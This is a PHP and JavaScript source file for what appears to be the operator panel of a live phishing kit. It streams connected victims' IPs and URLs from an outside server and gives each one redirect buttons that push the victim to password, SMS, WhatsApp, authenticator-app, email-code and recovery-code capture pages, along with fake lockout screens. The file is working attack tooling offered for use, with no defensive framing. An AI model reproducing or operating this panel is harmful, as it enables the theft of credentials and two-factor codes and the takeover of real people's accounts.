<?php
// Get the current domain
$currentDomain = $_SERVER['HTTP_HOST'];

// Check if 'domain' is set in the URL
$domain = isset($_GET['domain']) ? $_GET['domain'] : $currentDomain;

// Redirect if the domain is not set in the URL
if (!isset($_GET['domain'])) {
    header("Location: ?domain=" . urlencode($domain));
    exit;
}

// Mock data for total clients and today's clients (Replace with your actual logic to count clients)
$totalClients = 0; // Total socket IDs for the domain
$todayClients = 0; // Today's socket IDs
$uniqueIPs = [];   // Array to store unique IPs
$uniqueIPsToday = []; // Array to store unique IPs for today

// Replace this with your actual data retrieval logic to calculate totals
// Example: Fetch total clients and today's clients from your database or server
// $totalClients = fetchTotalClients($domain);
// $todayClients = fetchTodayClients($domain);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Client Dashboard</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <style>
        /* Modal and button styling */
        .modal-content {
            border-radius: 8px;
            border: none;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .modal-header {
            border-bottom: none;
            padding: 20px 24px 0;
        }
        .modal-body {
            padding: 16px 24px 24px;
        }
        .modal-title {
            font-size: 16px;
            font-weight: 500;
        }
        .btn-close {
            font-size: 14px;
        }
        .redirect-btn {
            background: white;
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 8px 16px;
            color: #1c1e21;
            font-size: 14px;
            font-weight: normal;
            transition: all 0.2s;
            margin: 4px;
            min-width: 120px;
        }
        .redirect-btn:hover {
            background: #f5f5f5;
            border-color: #ccc;
        }
        .buttons-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px;
            padding: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Client Dashboard for <?php echo htmlspecialchars($domain); ?></h1>
        <p>Total Clients: <span id="totalClientsCount"><?php echo $totalClients; ?></span></p>
        <p>Today's Clients: <span id="todayClientsCount"><?php echo $todayClients; ?></span></p>
        <hr>
        <p>Total Unique IPs: <span id="totalUniqueIPsCount">0</span></p>
        <p>Today's Unique IPs: <span id="todayUniqueIPsCount">0</span></p>
        <table class="table table-striped" id="clientTable">
            <thead>
                <tr>
                    <th>Socket ID</th>
                    <th>Client IP</th>
                    <th>Status</th>
                    <th>Last Updated</th>
                    <th>Current URL</th>
                    <th>Redirect</th>
                </tr>
            </thead>
            <tbody>
                <!-- Initial data will be populated here -->
            </tbody>
        </table>

        <!-- Redirect Modal -->
        <div class="modal fade" id="redirectModal" tabindex="-1" aria-labelledby="redirectModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="redirectModalLabel">Redirect Options</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <div class="d-flex flex-wrap justify-content-center" id="redirectButtons">
                            <!-- Buttons will be dynamically added here -->
                        </div>
                    </div>
                </div>
            </div>
        </div>

    <script>
    const eventSource = new EventSource('https://sc.qdconnmin.me/stream.php?domain=<?php echo urlencode($domain); ?>');

    eventSource.onmessage = function(event) {
        const clients = JSON.parse(event.data);
        const tbody = $('#clientTable tbody');
        tbody.empty(); // Clear current table rows

        // Convert to array and sort by timestamp (newest first)
        const sortedClients = Object.entries(clients).sort((a, b) => {
            return new Date(b[1].timestamp) - new Date(a[1].timestamp); // Ensure sorting is based on date
        });

        // Update total clients count
        $('#totalClientsCount').text(sortedClients.length);
        
        // Unique IPs
        const uniqueIPs = new Set();
        const uniqueIPsToday = new Set();
        const today = new Date();

        // Update today's clients count and unique IPs
        sortedClients.forEach(([socketId, client]) => {
            uniqueIPs.add(client.clientIp); // Add to total unique IPs
            
            const clientDate = new Date(client.timestamp);
            if (clientDate.getDate() === today.getDate() &&
                clientDate.getMonth() === today.getMonth() &&
                clientDate.getFullYear() === today.getFullYear()) {
                uniqueIPsToday.add(client.clientIp); // Add to today's unique IPs
            }
        });

        $('#todayClientsCount').text(sortedClients.length); // Use total for today
        $('#totalUniqueIPsCount').text(uniqueIPs.size); // Set unique total IPs
        $('#todayUniqueIPsCount').text(uniqueIPsToday.size); // Set unique today's IPs

        // Loop through sorted clients and populate the table
        $.each(sortedClients, function(index, [socketId, client]) {
            const rowClass = client.status === 'connected' ? 'table-success' : 'table-danger'; // Row color based on status
            tbody.append(`
                <tr class="${rowClass}">
                    <td>${socketId}</td>
                    <td>${client.clientIp}</td>
                    <td>${client.status}</td>
                    <td>${client.timestamp}</td>
                    <td>${client.currentUrl}</td>
                    <td><button class="btn btn-primary" onclick="showRedirectModal('${socketId}')">Redirect</button></td>
                </tr>
            `);
        });
    };

    function showRedirectModal(socketId) {
        const globalLink = '<?php echo $globalLink; ?>';
        
        $('#redirectModalLabel').text(`Redirect Options for ${socketId}`);
        
        const redirectButtons = `
            <div class="buttons-container">
                <a href="/sendMessage?socketId=${socketId}&message=login" target="_blank" class="redirect-btn">Password</a>
                <a href="/sendMessage?socketId=${socketId}&message=verify" target="_blank" class="redirect-btn">2FA Text</a>
                <a href="/sendMessage?socketId=${socketId}&message=emailcode" target="_blank" class="redirect-btn">Email Code</a>
                
                <a href="/sendMessage?socketId=${socketId}&message=reset" target="_blank" class="redirect-btn">Reset Password</a>
                <a href="/sendMessage?socketId=${socketId}&message=60min" target="_blank" class="redirect-btn">60 Min Block</a>
                <a href="/sendMessage?socketId=${socketId}&message=10min" target="_blank" class="redirect-btn">10 Min Block</a>
                
                <a href="/sendMessage?socketId=${socketId}&message=incorrect" target="_blank" class="redirect-btn">Wrong Email</a>
                <a href="/sendMessage?socketId=${socketId}&message=verifywp" target="_blank" class="redirect-btn">2FA WhatsApp</a>
                <a href="/sendMessage?socketId=${socketId}&message=verifyg" target="_blank" class="redirect-btn">2FA Auth App</a>
                
                <a href="/sendMessage?socketId=${socketId}&message=verifynotify" target="_blank" class="redirect-btn">2FA Notify</a>
                <a href="/sendMessage?socketId=${socketId}&message=verifybackup" target="_blank" class="redirect-btn">Recovery Codes</a>
                <a href="/sendMessage?socketId=${socketId}&message=restrict" target="_blank" class="redirect-btn">Restrict</a>

                <a href="/sendMessage?socketId=${socketId}&message=done" target="_blank" class="redirect-btn">Done</a>
                <a href="/sendMessage?socketId=${socketId}&message=career" target="_blank" class="redirect-btn">Checking...</a>
            </div>
        `;

        $('#redirectButtons').html(redirectButtons);
        $('#redirectModal').modal('show');
        
        $('#redirectButtons a').on('click', function() {
            $('#redirectModal').modal('hide');
        });
    }

    eventSource.onerror = function(event) {
        console.error('EventSource failed:', event);
    };
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
